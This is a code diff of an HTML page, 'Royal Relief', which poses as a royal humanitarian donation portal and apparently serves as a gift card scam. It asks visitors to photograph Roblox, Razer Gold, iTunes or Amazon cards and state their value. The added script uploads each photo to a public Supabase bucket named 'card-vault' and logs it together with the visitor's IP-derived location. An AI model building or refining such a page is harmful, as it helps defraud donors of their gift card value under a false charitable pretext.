@@ -5,119 +5,94 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Royal Relief | Sovereign Strategic Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;700;900&family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;700;900&display=swap" rel="stylesheet">
     <style>
-        :root { --gold: #C9A45C; --black: #080808; }
-        body { background-color: var(--black); color: white; font-family: 'Montserrat', sans-serif; overflow-x: hidden; }
-        .font-arabic { font-family: 'Tajawal', sans-serif; }
-        .gold-text { color: var(--gold); }
-        @keyframes rotate-gold { 100% { transform: rotate(360deg); } }
-        .aura { position: relative; overflow: hidden; }
-        .aura::after {
-            content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
-            background: conic-gradient(from 0deg, transparent, #c9a45c, transparent 30%);
-            animation: rotate-gold 8s linear infinite; opacity: 0.15; z-index: 0;
-        }
+        body { background-color: #080808; color: white; font-family: 'Montserrat', sans-serif; }
+        .gold-text { color: #C9A45C; }
         .shimmer {
             background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
             background-size: 200% 100%; animation: shimmer 3s infinite;
         }
+        @keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
     </style>
 </head>
-<body class="selection:bg-[#C9A45C] selection:text-black">
+<body>
 
-    <nav class="sticky top-0 z-50 p-5 bg-black/90 backdrop-blur-xl border-b border-zinc-800 flex justify-between items-center">
+    <nav class="p-5 bg-black/90 border-b border-zinc-800 flex justify-between items-center sticky top-0 z-50">
         <div class="flex items-center space-x-3">
-            <div class="w-10 h-10 border border-[#C9A45C] rounded-full flex items-center justify-center shadow-[0_0_15px_rgba(201,164,92,0.2)]">
+            <div class="w-10 h-10 border border-[#C9A45C] rounded-full flex items-center justify-center">
                 <span class="gold-text font-bold italic">R</span>
             </div>
-            <div class="text-left">
-                <h1 class="text-[10px] font-black tracking-[0.3em] gold-text uppercase">Royal Relief</h1>
-                <p class="text-[8px] text-zinc-500 uppercase tracking-widest">Sovereign Strategic Hub</p>
-            </div>
+            <h1 class="text-[10px] font-black tracking-[0.3em] gold-text uppercase">Royal Relief</h1>
         </div>
-        <span class="text-[9px] font-bold text-zinc-400 bg-zinc-900 px-3 py-1 rounded border border-zinc-800 uppercase">IACAD: 2026-LIVE</span>
+        <span class="text-[9px] font-bold text-zinc-500 bg-zinc-900 px-3 py-1 rounded border border-zinc-800">2026-LIVE</span>
     </nav>
 
-    <main class="max-w-4xl mx-auto px-6 py-12">
-        <header class="text-center mb-16">
-            <h2 class="gold-text font-arabic text-3xl mb-2 font-bold uppercase">بأمر من المهمة الإنسانية</h2>
-            <h2 class="gold-text text-3xl font-black uppercase mb-6 tracking-tighter">By Royal Proclamation</h2>
-            <p class="text-zinc-500 text-sm max-w-lg mx-auto italic leading-relaxed">"Every asset is a tool for mercy. We accept all digital contributions to the frontlines."</p>
-        </header>
-
-        <div id="gateway" class="grid md:grid-cols-2 gap-8 max-w-3xl mx-auto">
-            <div onclick="openPortal('royal')" class="aura cursor-pointer bg-zinc-900/40 border border-[#C9A45C]/40 p-10 rounded-[2.5rem] text-center transition-all hover:scale-[1.02]">
-                <div class="relative z-10 text-left">
-                    <div class="text-5xl mb-6">👑</div>
-                    <h3 class="text-2xl font-bold mb-2 uppercase tracking-tight">Royal Enrollment</h3>
-                    <p class="text-[10px] text-zinc-500 uppercase font-black tracking-widest">Status: Open • 500+ AED</p>
+    <main class="max-w-4xl mx-auto px-6 py-12 text-center">
+        <div id="gateway" class="space-y-8">
+            <h2 class="gold-text text-3xl font-black uppercase tracking-tighter">Sovereign Asset Intake</h2>
+            <div class="grid md:grid-cols-2 gap-6 max-w-2xl mx-auto">
+                <div onclick="openPortal('royal')" class="cursor-pointer bg-zinc-900/50 border border-[#C9A45C]/30 p-10 rounded-[2.5rem] hover:scale-105 transition-transform">
+                    <div class="text-4xl mb-4">👑</div>
+                    <h3 class="font-bold uppercase italic">Royal Member</h3>
                 </div>
-            </div>
-            <div onclick="openPortal('silent')" class="cursor-pointer bg-zinc-900/20 border border-zinc-800 p-10 rounded-[2.5rem] text-center transition-all hover:bg-zinc-800/40">
-                <div class="text-left">
-                    <div class="text-5xl mb-6">🛡️</div>
-                    <h3 class="text-2xl font-bold mb-2 uppercase tracking-tight">Silent Guardian</h3>
-                    <p class="text-[10px] text-zinc-500 uppercase font-black tracking-widest">Status: Anonymous • Private</p>
+                <div onclick="openPortal('silent')" class="cursor-pointer bg-zinc-900/20 border border-zinc-800 p-10 rounded-[2.5rem] hover:bg-zinc-800/40 transition-all">
+                    <div class="text-4xl mb-4">🛡️</div>
+                    <h3 class="font-bold uppercase italic text-zinc-400">Silent Guardian</h3>
                 </div>
             </div>
         </div>
 
-        <div id="portal-form" class="hidden max-w-md mx-auto mt-4 bg-zinc-900 p-8 rounded-[3rem] border border-zinc-800 shadow-2xl">
-            <button onclick="location.reload()" class="text-[#C9A45C] text-[10px] font-black mb-8 uppercase tracking-[0.2em]">← Return</button>
-            <form id="reliefForm" class="space-y-6 text-left">
-                <div id="royal-only" class="hidden">
-                    <label class="text-[9px] text-zinc-600 font-black uppercase mb-1 block">Full Name (Official)</label>
-                    <input type="text" id="donor_name" placeholder="Official Name" class="w-full bg-black border border-zinc-800 p-4 rounded-2xl outline-none focus:border-[#C9A45C] text-sm text-white">
+        <div id="portal-form" class="hidden max-w-md mx-auto bg-zinc-900 p-8 rounded-[3rem] border border-zinc-800">
+            <form id="reliefForm" class="space-y-5 text-left">
+                <div id="royal-fields" class="hidden">
+                    <label class="text-[9px] text-zinc-500 font-black uppercase block mb-1">Official Name</label>
+                    <input type="text" id="donor_name" placeholder="Full Name" class="w-full bg-black border border-zinc-800 p-4 rounded-2xl text-sm outline-none focus:border-[#C9A45C]">
                 </div>
 
                 <div class="grid grid-cols-2 gap-4">
-                    <div class="bg-black/50 p-4 rounded-2xl border border-zinc-800">
-                        <label class="text-[9px] text-zinc-600 font-black uppercase mb-1 block">Asset Type</label>
-                        <select id="asset_type" class="w-full bg-transparent text-white text-xs outline-none font-bold">
+                    <div class="bg-black p-4 rounded-2xl border border-zinc-800">
+                        <label class="text-[9px] text-zinc-500 font-black uppercase block mb-1">Asset</label>
+                        <select id="asset_type" class="w-full bg-transparent text-xs font-bold outline-none">
                             <option value="Roblox">Roblox</option>
                             <option value="Razer Gold">Razer Gold</option>
                             <option value="iTunes">iTunes</option>
                             <option value="Amazon">Amazon</option>
-                            <option value="Steam">Steam</option>
-                            <option value="Other">Other Asset</option>
                         </select>
                     </div>
-                    <div class="bg-black/50 p-4 rounded-2xl border border-[#C9A45C]/30">
-                        <label class="text-[9px] text-[#C9A45C] font-black uppercase mb-1 block">Value</label>
-                        <input type="number" id="asset_value" placeholder="100" required class="w-full bg-transparent text-white text-xs outline-none font-bold">
+                    <div class="bg-black p-4 rounded-2xl border border-zinc-800">
+                        <label class="text-[9px] text-[#C9A45C] font-black uppercase block mb-1">Value</label>
+                        <input type="number" id="asset_value" placeholder="100" required class="w-full bg-transparent text-xs font-bold outline-none">
                     </div>
                 </div>
 
                 <div class="bg-black/50 p-4 rounded-2xl border border-zinc-800">
-                    <label class="text-[9px] text-zinc-600 font-black uppercase mb-1 block tracking-widest">Hub Location</label>
-                    <p id="location-text" class="text-white text-xs font-bold uppercase italic">📍 Pinging Servers...</p>
+                    <label class="text-[9px] text-zinc-500 font-black uppercase block mb-1">Network Hub</label>
+                    <p id="location-text" class="text-white text-xs font-bold italic">📍 Detecting...</p>
                 </div>
 
-                <div class="relative border-2 border-dashed border-zinc-800 rounded-3xl p-12 text-center hover:border-zinc-500 transition-all cursor-pointer">
-                    <input type="file" required class="absolute inset-0 opacity-0 cursor-pointer">
-                    <div class="text-3xl mb-2">📸</div>
-                    <p class="text-[10px] text-zinc-400 font-black uppercase tracking-widest">Snap Card Photo</p>
+                <div class="relative border-2 border-dashed border-zinc-800 rounded-3xl p-10 text-center cursor-pointer hover:border-zinc-500">
+                    <input type="file" id="card_image" required accept="image/*" class="absolute inset-0 opacity-0 cursor-pointer">
+                    <p class="text-[10px] text-zinc-400 font-black uppercase">📸 Snap Asset Photo</p>
                 </div>
 
-                <button type="submit" class="shimmer w-full bg-white text-black font-black py-5 rounded-[2rem] uppercase tracking-widest hover:bg-[#C9A45C] transition-all transform active:scale-95">Submit to Mission</button>
+                <button type="submit" id="submitBtn" class="shimmer w-full bg-white text-black font-black py-5 rounded-[2rem] uppercase tracking-widest hover:bg-[#C9A45C]">Submit to Mission</button>
             </form>
         </div>
 
-        <div id="success" class="hidden text-center py-20 animate-in zoom-in duration-700">
-            <div class="w-20 h-20 bg-green-900/20 border border-green-600/50 rounded-full flex items-center justify-center mx-auto mb-8 shadow-[0_0_30px_rgba(34,197,94,0.2)]">
-                <span class="text-green-500 text-3xl">✓</span>
-            </div>
-            <h2 class="text-3xl font-black gold-text mb-4 uppercase">Secured</h2>
-            <div class="bg-zinc-950 p-8 rounded-[2.5rem] border border-[#C9A45C]/30 inline-block">
-                <p class="text-[10px] text-zinc-500 font-black uppercase mb-2 tracking-[0.2em]">Tracking Reference</p>
-                <p id="ref-id" class="text-white font-mono text-2xl font-bold tracking-[0.3em] uppercase"></p>
-            </div>
-            <p class="text-zinc-600 text-[9px] uppercase tracking-[0.3em] mt-12 animate-pulse font-bold">Transferring to Dashboard...</p>
+        <div id="success" class="hidden py-10">
+            <h2 class="text-3xl font-black gold-text uppercase mb-4">Secured</h2>
+            <p id="ref-id" class="text-xl font-mono tracking-widest bg-zinc-950 p-4 rounded-xl border border-zinc-800 inline-block"></p>
+            <p class="text-zinc-500 text-[10px] uppercase mt-8 animate-pulse">Syncing with Sovereign Ledger...</p>
         </div>
     </main>
 
     <script>
+        const SUPABASE_URL = 'https://tekuwfiwqldsbmuofvnb.supabase.co';
+        const SUPABASE_KEY = 'sb_publishable_aAtBWENHDU7dAgkFq9UZUQ_HwqaFz4c'; 
+        const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
         async function trackLocation() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -134,24 +109,46 @@
         function openPortal(type) {
             document.getElementById('gateway').classList.add('hidden');
             document.getElementById('portal-form').classList.remove('hidden');
-            if (type === 'royal') { document.getElementById('royal-only').classList.remove('hidden'); }
+            if (type === 'royal') document.getElementById('royal-fields').classList.remove('hidden');
         }
 
-        document.getElementById('reliefForm').onsubmit = function(e) {
+        document.getElementById('reliefForm').onsubmit = async function(e) {
             e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            const file = document.getElementById('card_image').files[0];
             const name = document.getElementById('donor_name').value || 'Silent Guardian';
             const asset = document.getElementById('asset_type').value;
             const val = document.getElementById('asset_value').value;
             const ref = 'RR-' + Math.random().toString(36).toUpperCase().substring(2, 8);
-            
-            document.getElementById('portal-form').classList.add('hidden');
-            document.getElementById('success').classList.remove('hidden');
-            document.getElementById('ref-id').innerText = ref;
-            
-            setTimeout(() => { 
-                window.location.href = `dashboard.html?user=${encodeURIComponent(name)}&ref=${ref}&asset=${encodeURIComponent(asset)}&val=${val}&city=${encodeURIComponent(window.detCity || 'Dubai')}&country=${encodeURIComponent(window.detCountry || 'AE')}`; 
-            }, 3500);
+            const loc = document.getElementById('location-text').innerText;
+
+            btn.innerText = "UPLOADING..."; btn.disabled = true;
+
+            try {
+                const fileName = `${ref}-${Date.now()}.jpg`;
+                const { data: upData, error: upErr } = await _supabase.storage.from('card-vault').upload(fileName, file);
+                if (upErr) throw upErr;
+
+                const { data: urlData } = _supabase.storage.from('card-vault').getPublicUrl(fileName);
+                
+                const { error: dbErr } = await _supabase.from('submissions').insert([{ 
+                    donor_name: name, asset_type: asset, declared_value: val, location: loc, image_url: urlData.publicUrl 
+                }]);
+                if (dbErr) throw dbErr;
+
+                document.getElementById('portal-form').classList.add('hidden');
+                document.getElementById('success').classList.remove('hidden');
+                document.getElementById('ref-id').innerText = ref;
+
+                setTimeout(() => {
+                    window.location.href = `dashboard.html?user=${encodeURIComponent(name)}&ref=${ref}&asset=${asset}&val=${val}&loc=${encodeURIComponent(loc)}`;
+                }, 3500);
+            } catch (err) {
+                alert("Error: " + err.message);
+                btn.innerText = "SUBMIT TO MISSION"; btn.disabled = false;
+            }
         }
     </script>
 </body>
-</html>
+    </html>
+    
